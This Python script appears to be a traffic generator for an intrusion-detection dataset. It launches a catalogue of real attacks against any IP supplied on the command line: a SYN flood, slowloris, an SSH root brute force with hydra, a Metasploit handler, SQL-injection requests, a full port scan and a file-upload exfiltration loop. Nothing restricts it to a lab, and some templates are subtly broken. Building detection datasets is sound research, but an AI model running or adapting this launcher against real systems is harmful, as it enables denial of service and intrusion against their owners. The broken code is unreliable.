#!/usr/bin/env python3
"""
Automated Threat Orchestration Engine (ATOE)
======================================================
Description:
    Enterprise-grade orchestration daemon for executing stateful 
    network attack simulations. Ensures high-fidelity data generation 
    for XGBoost model training via strict process isolation, dependency 
    validation, and TCP session lifecycle management.
"""
import os
import sys
import time
import signal
import shutil
import logging
import argparse
import subprocess
from dataclasses import dataclass
from typing import List, Optional
# ==========================================
# CONFIGURATION & DATA STRUCTURES
# ==========================================
@dataclass
class Scenario:
    """Immutable data structure representing a network traffic profile."""
    name: str
    tool: str
    command_template: str
    duration_seconds: int
# System Constants
TCP_COOLDOWN_SECONDS: int = 120
LOG_FORMAT: str = "%(asctime)s | [%(levelname)s] | %(message)s"
# Pre-defined orchestration catalog mapping to the capture dataset
SCENARIO_CATALOG: List[Scenario] = [
    Scenario("BENIGN",     "curl",       "for i in {1..10000}; do curl -s http://{target} > /dev/null; sleep 1.8; done", 18000),
    Scenario("PortScan",   "nmap",       "nmap -sS -sV -p 1-65535 -T4 {target}", 9000),
    Scenario("DDoS",       "hping3",     "hping3 -S --flood -p 80 {target}", 14400),
    Scenario("BruteForce", "hydra",      "hydra -l root -P passwords.txt ssh://{target}", 5400),
    Scenario("Botnet",     "msfconsole", "msfconsole -q -x 'use exploit/multi/handler; set LHOST eth0; exploit -j'", 5400),
    Scenario("DataExfil",  "curl",       "for i in {1..1020}; do curl -X POST -F 'file=@data.bin' http://{target}/upload; sleep 12; done", 12600),
    Scenario("WebAttack",  "curl",       "for i in {1..1109}; do curl -s 'http://{target}/?id=$i%27%20OR%201=1--' > /dev/null; sleep 9; done", 10800),
    Scenario("SlowLoris",  "slowloris",  "slowloris {target} -s 500", 10800)
]
# ==========================================
# ENGINE IMPLEMENTATION
# ==========================================
class ThreatOrchestrator:
    """
    Manages the secure lifecycle, isolation, and termination of 
    child processes generating network anomalies.
    """
    def __init__(self, target_ip: str, catalog: List[Scenario]):
        self.target_ip = target_ip
        self.catalog = catalog
        self.active_process: Optional[subprocess.Popen] = None
        
        self._initialize_logger()
        self._register_interrupt_handlers()
    def _initialize_logger(self) -> None:
        """Configures structured standard output logging."""
        logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
        self.logger = logging.getLogger("ATOE_Engine")
    def _register_interrupt_handlers(self) -> None:
        """Binds SIGINT for graceful degradation on manual abort."""
        signal.signal(signal.SIGINT, self._handle_emergency_stop)
    def _handle_emergency_stop(self, signum: int, frame: Optional[object]) -> None:
        """Executes emergency teardown sequence."""
        self.logger.warning("\n[!] Emergency abort triggered. Neutralizing processes...")
        self._terminate_active_process_group()
        sys.exit(130)
    def _terminate_active_process_group(self) -> None:
        """Aggressively sweeps and terminates the active process tree."""
        if self.active_process and self.active_process.poll() is None:
            try:
                pgid = os.getpgid(self.active_process.pid)
                os.killpg(pgid, signal.SIGTERM)
                time.sleep(2)
                if self.active_process.poll() is None:
                    os.killpg(pgid, signal.SIGKILL)
                self.logger.info("Process tree neutralized.")
            except ProcessLookupError:
                pass
    def _validate_environment(self) -> None:
        """Validates execution privileges and binary dependencies."""
        if os.geteuid() != 0:
            self.logger.error("Fatal: Root privileges required for socket layer access.")
            sys.exit(1)
        missing_binaries = {
            s.tool for s in self.catalog if not shutil.which(s.tool.split()[0])
        }
        
        if missing_binaries:
            self.logger.error(f"Fatal: Missing required binaries: {', '.join(missing_binaries)}")
            sys.exit(1)
            
        self.logger.info("Environment pre-flight checks passed.")
    def run(self) -> None:
        """Executes the complete orchestration catalog sequentially."""
        self.logger.info(f"Initializing Framework against target: {self.target_ip}")
        self._validate_environment()
        
        for index, scenario in enumerate(self.catalog, 1):
            self._execute_scenario(scenario, index, len(self.catalog))
            
        self.logger.info("Orchestration pipeline fully depleted. Exiting cleanly.")
    def _execute_scenario(self, scenario: Scenario, current: int, total: int) -> None:
        """
        Executes a singular threat profile within a strict time window.
        """
        self.logger.info(f"{'='*55}")
        self.logger.info(f"STAGE [{current}/{total}]: {scenario.name.upper()}")
        
        command = scenario.command_template.format(target=self.target_ip)
        
        try:
            self.active_process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )
            
            self.logger.info(f"Engine     : {scenario.tool}")
            self.logger.info(f"Process ID : {self.active_process.pid}")
            self.logger.info(f"Duration   : {scenario.duration_seconds} seconds")
            
            start_time = time.time()
            while (time.time() - start_time) < scenario.duration_seconds:
                if self.active_process.poll() is not None:
                    self.logger.warning(f"Process exited prematurely (Exit Code: {self.active_process.returncode})")
                    break
                time.sleep(5)
                
        except Exception as e:
            self.logger.error(f"Runtime exception during {scenario.name}: {e}")
            
        finally:
            self._terminate_active_process_group()
            self.logger.info(f"Stage complete. Enforcing {TCP_COOLDOWN_SECONDS}s TCP cooldown window...")
            time.sleep(TCP_COOLDOWN_SECONDS)
# ==========================================
# ENTRY POINT
# ==========================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ATOE: Automated Threat Orchestration Engine")
    parser.add_argument(
        "--target", 
        required=True, 
        help="IPv4 address of the target machine/firewall"
    )
    args = parser.parse_args()
    engine = ThreatOrchestrator(target_ip=args.target, catalog=SCENARIO_CATALOG)
    engine.run()